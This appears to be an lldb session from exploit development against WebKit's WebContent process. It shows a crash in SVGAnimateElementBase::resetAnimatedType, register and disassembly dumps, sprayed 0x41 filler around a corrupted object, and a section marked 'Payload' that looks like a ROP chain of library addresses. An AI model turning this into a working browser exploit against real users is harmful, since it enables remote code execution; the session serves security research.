$ ps -ax | grep WebContent
$ lldb -p $(pid)

WebCore`WebCore::SVGAnimateElementBase::resetAnimatedType:
->  0x7fff604547fa <+682>: callq  *0x10(%rax)
    0x7fff604547fd <+685>: movq   -0x48(%rbp), %rax
    0x7fff60454801 <+689>: movq   $0x0, -0x48(%rbp)
    0x7fff60454809 <+697>: movq   0x2a8(%rbx), %rdi
Target 0: (com.apple.WebKit.WebContent) stopped.
(lldb) register info
invalid command 'register info'.
(lldb) registers info
error: 'registers' is not a valid command.
error: Unrecognized command 'registers'.
(lldb) register read
General Purpose Registers:
       rax = 0x030c022d81015a00
       rbx = 0x00000007632bb900
       rcx = 0x0000000000000002
       rdx = 0x00007ffeea8ebba0
       rdi = 0x00007ffeea8ebb98
       rsi = 0x000000076326e7d0
       rbp = 0x00007ffeea8ebbe0
       rsp = 0x00007ffeea8ebb60
        r8 = 0x0000000000000007
        r9 = 0x00000007632a1720
       r10 = 0x0000000764e2f200
       r11 = 0x0000000000000002
       r12 = 0x00000007632bb9a0
       r13 = 0x00000007632bb900
       r14 = 0x00000007624d0740
       r15 = 0x000000076326e7d0
       rip = 0x00007fff604547fa  WebCore`WebCore::SVGAnimateElementBase::resetAnimatedType() + 682
    rflags = 0x0000000000010246
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000


(lldb) x/20i $rip-0x20
    0x7fff604547da: 00 00                    addb   %al, (%rax)
    0x7fff604547dc: 48 85 ff                 testq  %rdi, %rdi
    0x7fff604547df: 74 73                    je     0x7fff60454854            ; <+772>
    0x7fff604547e1: 8b 07                    movl   (%rdi), %eax
    0x7fff604547e3: 83 c0 fe                 addl   $-0x2, %eax
    0x7fff604547e6: 74 53                    je     0x7fff6045483b            ; <+747>
    0x7fff604547e8: 89 07                    movl   %eax, (%rdi)
    0x7fff604547ea: eb 68                    jmp    0x7fff60454854            ; <+772>
    0x7fff604547ec: 49 8b 07                 movq   (%r15), %rax
    0x7fff604547ef: 48 8d 7d b8              leaq   -0x48(%rbp), %rdi
    0x7fff604547f3: 48 8d 55 c0              leaq   -0x40(%rbp), %rdx
    0x7fff604547f7: 4c 89 fe                 movq   %r15, %rsi
->  0x7fff604547fa: ff 50 10                 callq  *0x10(%rax)
    0x7fff604547fd: 48 8b 45 b8              movq   -0x48(%rbp), %rax
    0x7fff60454801: 48 c7 45 b8 00 00 00 00  movq   $0x0, -0x48(%rbp)
    0x7fff60454809: 48 8b bb a8 02 00 00     movq   0x2a8(%rbx), %rdi
    0x7fff60454810: 48 89 83 a8 02 00 00     movq   %rax, 0x2a8(%rbx)
    0x7fff60454817: 48 85 ff                 testq  %rdi, %rdi
    0x7fff6045481a: 74 26                    je     0x7fff60454842            ; <+754>
    0x7fff6045481c: 48 8b 07                 movq   (%rdi), %rax



$r15
(lldb) x/10gx 0x000000076326e7d0
0x76326e7d0: 0x030c022d81015a00 0x0350080e07140108
0x76326e7e0: 0x080e074c0908030e 0x4141414141080350
0x76326e7f0: 0x4141414141414141 0x00007fffac6142b0
0x76326e800: 0x4141410300000001 0x000063b295c2fbbc
0x76326e810: 0x0000000764e2e6c0 0x000063b295c2d2db
(lldb) x/20gx 0x000000076326e7d0-0x20
0x76326e7b0: 0x4141414141414141 0x4141414141414141
0x76326e7c0: 0x4141414141414141 0x4141414141414141
0x76326e7d0: 0x030c022d81015a00 0x0350080e07140108
0x76326e7e0: 0x080e074c0908030e 0x4141414141080350
0x76326e7f0: 0x4141414141414141 0x00007fffac6142b0
0x76326e800: 0x4141410300000001 0x000063b295c2fbbc
0x76326e810: 0x0000000764e2e6c0 0x000063b295c2d2db
0x76326e820: 0x0000000000000000 0x0000000100000000
0x76326e830: 0x00000007632bb800 0x00000007637003a8
0x76326e840: 0x0000000764c03f98 0x0000000000000000



Payload

(lldb) x/20gx 0x80051c018
0x80051c018: 0x00007fff5f0c96cb 0x0000000000000000
0x80051c028: 0x00007fff5f38daa5 0x0000000000000000
0x80051c038: 0x00007fff5f0c96ce 0x00007fff5fc57a5c
0x80051c048: 0x00007fff5f70269d 0x0000000000000000
0x80051c058: 0x00007fff5f18ee4e 0x0000000000000010
0x80051c068: 0x00007fff5f179036 0x0000000000000007
0x80051c078: 0x00007fff5f117bd3 0x0000000000001002
0x80051c088: 0x00007fff5f0f9516 0x00000000ffffffff
0x80051c098: 0x0000000000000000 0x00007fff5fa1c9ad
0x80051c0a8: 0x0000000000000000 0x00007fff6065295e